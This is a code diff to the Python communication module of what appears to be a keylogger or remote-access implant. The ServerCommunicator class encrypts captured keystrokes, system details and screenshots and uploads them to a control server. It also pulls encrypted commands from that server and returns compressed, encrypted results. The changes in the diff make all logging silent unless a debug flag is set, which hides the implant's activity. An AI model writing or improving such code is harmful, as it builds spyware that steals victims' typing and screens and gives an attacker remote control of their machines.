@@ -1,11 +1,23 @@
 import requests
 import json
 import logging
-from config import Config
-import warnings
-import base64
 import gzip
-warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
+import base64
+from config import Config
+
+# Configure logging based on DEBUG_MODE
+if Config.DEBUG_MODE:
+    logging.basicConfig(
+        level=logging.INFO,
+        format='[%(asctime)s] %(levelname)s: %(message)s',
+        handlers=[
+            logging.FileHandler(Config.ERROR_LOG_FILE),
+            logging.StreamHandler()
+        ]
+    )
+else:
+    logging.getLogger().addHandler(logging.NullHandler())
+    logging.getLogger().setLevel(logging.CRITICAL + 1)
 
 class ServerCommunicator:
     def __init__(self, client_id, encryption_manager):
@@ -13,18 +25,14 @@ class ServerCommunicator:
         self.encryption = encryption_manager
         self.server_url = Config.SERVER_URL
         self.token = Config.SECRET_TOKEN
-        logging.basicConfig(
-            filename='errors.log',
-            level=logging.INFO,
-            format='[%(asctime)s] %(levelname)s: %(message)s'
-        )
 
     def _send_request(self, endpoint, data=None, files=None):
         try:
             endpoint = endpoint.lstrip('?/')
             base_url = self.server_url.rstrip('/')
             url = f"{base_url}/{endpoint}"
-            logging.info(f"Sending request to {url} with data: {data}, files: {files is not None}")
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending request to {url} with data: {data}, files: {files is not None}")
             response = requests.post(
                 url,
                 data=data,
@@ -35,51 +43,62 @@ class ServerCommunicator:
             )
             return self._handle_response(response)
         except requests.exceptions.RequestException as e:
-            logging.error(f"Connection error: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Connection error: {str(e)}")
             raise CommunicationError(f"Connection error: {str(e)}")
 
     def _handle_response(self, response):
-        logging.info(f"Received response: status={response.status_code}, text={response.text[:100]}...")
+        if Config.DEBUG_MODE:
+            logging.info(f"Received response: status={response.status_code}, text={response.text[:100]}...")
         if response.status_code == 200:
             try:
                 data = response.json()
                 if not isinstance(data, dict) or 'commands' not in data:
-                    logging.error("Invalid response format: Missing 'commands' key")
+                    if Config.DEBUG_MODE:
+                        logging.error("Invalid response format: Missing 'commands' key")
                     raise CommunicationError("Invalid response format: Missing 'commands' key")
                 if not isinstance(data['commands'], list):
-                    logging.error("Invalid commands format: Expected list")
+                    if Config.DEBUG_MODE:
+                        logging.error("Invalid commands format: Expected list")
                     raise CommunicationError("Invalid commands format: Expected list")
                 return data['commands']
             except json.JSONDecodeError:
-                logging.error("Invalid JSON response")
+                if Config.DEBUG_MODE:
+                    logging.error("Invalid JSON response")
                 raise CommunicationError("Invalid JSON response")
         else:
-            logging.error(f"Server error: {response.status_code}, response: {response.text}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Server error: {response.status_code}, response: {response.text}")
             raise CommunicationError(f"Server error: {response.status_code}")
 
     def upload_data(self, keystrokes, system_info, screenshot=None):
         try:
             if not keystrokes or not isinstance(keystrokes, list):
-                logging.warning("Keystrokes is empty or not a list")
+                if Config.DEBUG_MODE:
+                    logging.warning("Keystrokes is empty or not a list")
                 keystrokes = ['']
             if not system_info or not isinstance(system_info, dict):
-                logging.warning("System_info is empty or not a dict")
+                if Config.DEBUG_MODE:
+                    logging.warning("System_info is empty or not a dict")
                 system_info = {'error': 'No system info provided'}
 
             keystrokes_str = ' '.join(str(k) for k in keystrokes if k)
             system_info_json = json.dumps(system_info, ensure_ascii=False)
 
-            logging.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}, system_info_len={len(system_info_json)}")
+            if Config.DEBUG_MODE:
+                logging.info(f"Preparing upload: client_id={self.client_id}, keystrokes_len={len(keystrokes_str)}, system_info_len={len(system_info_json)}")
 
             try:
                 encrypted_keystrokes = self.encryption.encrypt(keystrokes_str)
                 encrypted_system_info = self.encryption.encrypt(system_info_json)
             except Exception as e:
-                logging.error(f"Encryption failed: {str(e)}")
+                if Config.DEBUG_MODE:
+                    logging.error(f"Encryption failed: {str(e)}")
                 raise CommunicationError(f"Encryption failed: {str(e)}")
 
             if not encrypted_keystrokes or not encrypted_system_info:
-                logging.error("Encryption produced empty output")
+                if Config.DEBUG_MODE:
+                    logging.error("Encryption produced empty output")
                 raise CommunicationError("Encryption produced empty output")
 
             encrypted_data = {
@@ -93,9 +112,11 @@ class ServerCommunicator:
             files = {}
             if screenshot:
                 files['screenshot'] = ('screenshot.png', screenshot, 'image/png')
-                logging.info("Including screenshot in upload")
+                if Config.DEBUG_MODE:
+                    logging.info("Including screenshot in upload")
 
-            logging.info(f"Sending upload_data: {encrypted_data}, files: {files is not None}")
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending upload_data: {encrypted_data}, files: {files is not None}")
 
             response = requests.post(
                 self.server_url,
@@ -106,19 +127,23 @@ class ServerCommunicator:
             )
 
             if response.status_code != 200:
-                logging.error(f"Upload failed: status={response.status_code}, response={response.text}")
+                if Config.DEBUG_MODE:
+                    logging.error(f"Upload failed: status={response.status_code}, response={response.text}")
                 raise CommunicationError(f"Upload failed: {response.text}")
 
-            logging.info("Upload successful")
+            if Config.DEBUG_MODE:
+                logging.info("Upload successful")
             return response.json()
 
         except Exception as e:
-            logging.error(f"Upload error: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Upload error: {str(e)}")
             raise CommunicationError(f"Upload error: {str(e)}")
 
     def fetch_commands(self):
         try:
-            logging.info("Fetching commands...")
+            if Config.DEBUG_MODE:
+                logging.info("Fetching commands...")
             response = self._send_request(
                 "action=get_commands",
                 data={
@@ -127,38 +152,46 @@ class ServerCommunicator:
                     "token": self.token
                 }
             )
-            logging.info(f"Raw commands received: {response}")
+            if Config.DEBUG_MODE:
+                logging.info(f"Raw commands received: {response}")
             validated_commands = []
             for cmd in response:
                 if not all(k in cmd for k in ('id', 'command')):
-                    logging.warning(f"Skipping invalid command: {cmd}")
+                    if Config.DEBUG_MODE:
+                        logging.warning(f"Skipping invalid command: {cmd}")
                     continue
                 try:
                     decrypted = self.encryption.decrypt(cmd['command'])
-                    logging.info(f"Decrypted command: {decrypted}")
+                    if Config.DEBUG_MODE:
+                        logging.info(f"Decrypted command: {decrypted}")
                     command_data = json.loads(decrypted)
-                    logging.info(f"Parsed command data: {command_data}")
+                    if Config.DEBUG_MODE:
+                        logging.info(f"Parsed command data: {command_data}")
                     if 'type' not in command_data:
-                        logging.error(f"Command missing 'type': {command_data}")
+                        if Config.DEBUG_MODE:
+                            logging.error(f"Command missing 'type': {command_data}")
                         continue
                     cmd['type'] = command_data['type']
                     validated_commands.append(cmd)
                 except Exception as e:
-                    logging.error(f"Command validation failed: {str(e)}, command={cmd}")
-            logging.info(f"Validated commands: {validated_commands}")
+                    if Config.DEBUG_MODE:
+                        logging.error(f"Command validation failed: {str(e)}, command={cmd}")
+            if Config.DEBUG_MODE:
+                logging.info(f"Validated commands: {validated_commands}")
             return validated_commands
         except Exception as e:
-            logging.error(f"Failed to fetch commands: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to fetch commands: {str(e)}")
             raise CommunicationError(f"Failed to process commands: {str(e)}")
-
 
     def send_command_result(self, command_id, result):
         try:
-            logging.info(f"Sending command result for command_id: {command_id}")
-            # فشرده‌سازی نتیجه
+            if Config.DEBUG_MODE:
+                logging.info(f"Sending command result for command_id: {command_id}")
             compressed_result = gzip.compress(json.dumps(result).encode())
             encrypted_result = self.encryption.encrypt(base64.b64encode(compressed_result).decode())
-            logging.info(f"Encrypted result: {encrypted_result[:50]}...")
+            if Config.DEBUG_MODE:
+                logging.info(f"Encrypted result: {encrypted_result[:50]}...")
             data = {
                 'action': 'command_response',
                 'client_id': self.client_id,
@@ -174,11 +207,13 @@ class ServerCommunicator:
                 timeout=Config.COMMAND_TIMEOUT
             )
             response.raise_for_status()
-            result_data = response.json()
-            logging.info(f"Received response: status={response.status_code}, text={response.text}")
-            return result_data
+            if Config.DEBUG_MODE:
+                logging.info(f"Received response: status={response.status_code}, text={response.text}")
+            return response.json()
         except Exception as e:
-            logging.error(f"Failed to send command result: {str(e)}")
+            if Config.DEBUG_MODE:
+                logging.error(f"Failed to send command result: {str(e)}")
             raise CommunicationError(f"Failed to send command result: {str(e)}")
+
 class CommunicationError(Exception):
     pass
